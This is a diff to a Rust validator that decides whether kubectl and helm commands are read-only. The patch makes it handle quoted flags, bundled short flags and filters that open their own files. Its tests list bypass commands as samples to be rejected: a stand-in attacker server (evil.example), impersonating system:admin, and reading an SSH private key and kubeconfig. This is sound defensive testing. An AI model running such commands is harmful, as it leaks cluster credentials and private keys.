@@ -142,7 +142,9 @@ pub fn read_only(command: &str) -> bool {
     // A URL reaches out (a file fetched, the cluster's data sent away), and
     // flags that change who asks, which server or what is read make a read
     // something else (an exec plugin in a kubeconfig runs any program)
-    if command.split_whitespace().any(|word| word.contains("://") || changes_the_read(word)) {
+    // Words as the shell hands them over: quotes and backslashes gone, so a
+    // quoted flag (`'--kubeconfig=x'`, `"--as"`, `--kubeconfig\=x`) is the flag
+    if command.split_whitespace().map(unquoted).any(|word| word.contains("://") || changes_the_read(&word)) {
         return false;
     }
     let steps = command.split("&&").flat_map(|s| s.split("||")).flat_map(|s| s.split(';'));
@@ -181,8 +183,25 @@ fn changes_the_read(word: &str) -> bool {
         let name = long.split('=').next().unwrap_or_default();
         return name.starts_with("kube-") || name == "from-file" || LONG.iter().any(|f| f[2..] == *name);
     }
-    // -s (server), -f (a file or URL; jq's program file), -k (kustomize)
-    word.strip_prefix('-').is_some_and(|short| short.starts_with(['s', 'f', 'k']))
+    // -s (server), -f (a file or URL; jq's program file), -k (kustomize),
+    // also inside a bundle of short flags (`-As x` is `-A -s x`): the letters
+    // are flags until one that takes a value, whose value the rest is
+    let Some(short) = word.strip_prefix('-') else { return false };
+    for letter in short.chars() {
+        if matches!(letter, 's' | 'f' | 'k') {
+            return true;
+        }
+        // kubectl's and the filters' flags that take no value
+        if !matches!(letter, 'A' | 'w' | 'h' | 'i' | 'r' | 'v' | 'c' | 'E' | 'q' | 'H') {
+            return false;
+        }
+    }
+    false
+}
+
+/// A word as the shell passes it on: its quotes and backslashes removed
+fn unquoted(word: &str) -> String {
+    word.chars().filter(|c| !matches!(c, '\'' | '"' | '\\')).collect()
 }
 
 /// A text filter that only writes to its output. Left out: `awk` (runs
@@ -190,6 +209,11 @@ fn changes_the_read(word: &str) -> bool {
 /// them with `load`); `uniq` writes to a second file argument
 fn filter(step: &str) -> bool {
     let words: Vec<&str> = step.split_whitespace().collect();
+    // A filter reads what is piped to it, not a file of its own (`cat
+    // /root/.ssh/id_ed25519` would hand the task host's key over)
+    if words.iter().skip(1).map(|w| unquoted(w)).any(|w| w.contains('/') || w.starts_with('~')) {
+        return false;
+    }
     match words.as_slice() {
         ["uniq", args @ ..] => args.iter().all(|a| a.starts_with('-')),
         [name, ..] => matches!(*name, "grep" | "egrep" | "head" | "tail" | "wc" | "cut" | "jq" | "column" | "cat"),
@@ -243,11 +267,22 @@ mod tests {
             "kubectl version | yq -n -s '\"/tmp/kc\"' '{}'",
             "kubectl get cm x -o json | jq --rawfile k /root/.kube/config .",
             "kubectl get pods | jq -f /tmp/prog.jq",
+            // Quoted or escaped, a flag is still the flag once the shell has it
+            "kubectl get pods '--kubeconfig=/tmp/kc'",
+            "kubectl get pods \"--as\" system:admin",
+            "kubectl get ''--raw /api/v1/namespaces/default/services/x:80/proxy/",
+            "kubectl get pods --kubeconfig\\=/tmp/kc",
+            // A short flag inside a bundle
+            "kubectl get pods -As evil.example:6443",
+            "kubectl get pods -Af x.yaml",
+            // A filter reading a file of its own
+            "kubectl version | cat /root/.ssh/id_ed25519",
+            "kubectl get pods | grep x ~/.kube/config",
         ] {
             assert!(!read_only(no), "{no}");
         }
         // What a read looks like stays a read
-        for ok in ["kubectl get pods -A -o wide", "kubectl logs web -c app --since=1h | tail -5", "kubectl get svc -n kube-system -l k8s-app=kube-dns", "kubectl get nodes -o jsonpath='{.items[*].metadata.name}'", "kubectl get deploy -o json | jq -r .items[0].metadata.name", "helm list -A"] {
+        for ok in ["kubectl get pods -A -o wide", "kubectl logs web -c app --since=1h | tail -5", "kubectl get svc -n kube-system -l k8s-app=kube-dns", "kubectl get nodes -o jsonpath='{.items[*].metadata.name}'", "kubectl get deploy -o json | jq -r .items[0].metadata.name", "helm list -A", "kubectl get pods -ojsonpath='{.items[0].metadata.name}'", "kubectl get pods -Aw", "kubectl logs web | grep -ci error"] {
             assert!(read_only(ok), "{ok}");
         }
     }
